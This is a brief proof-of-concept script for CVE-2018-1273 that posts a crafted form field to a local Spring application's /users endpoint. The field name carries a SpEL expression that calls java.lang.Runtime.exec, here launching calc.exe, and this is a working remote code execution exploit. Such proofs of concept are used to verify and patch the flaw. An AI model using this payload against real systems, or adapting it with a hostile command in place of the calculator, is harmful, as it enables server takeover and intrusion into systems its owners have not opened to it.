#include "http"

// CVE-2018-1273
// https://xz.aliyun.com/t/2269
def poc(){
    // application/x-www-form-urlencoded alias
    contentType = "form";
    // request body (only in post method)
    body = "username[#this.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"calc.exe\")]";
    // do http post request
    http::doPost("http://127.0.0.1:8080/users",newMap(),body,contentType);
}

poc();
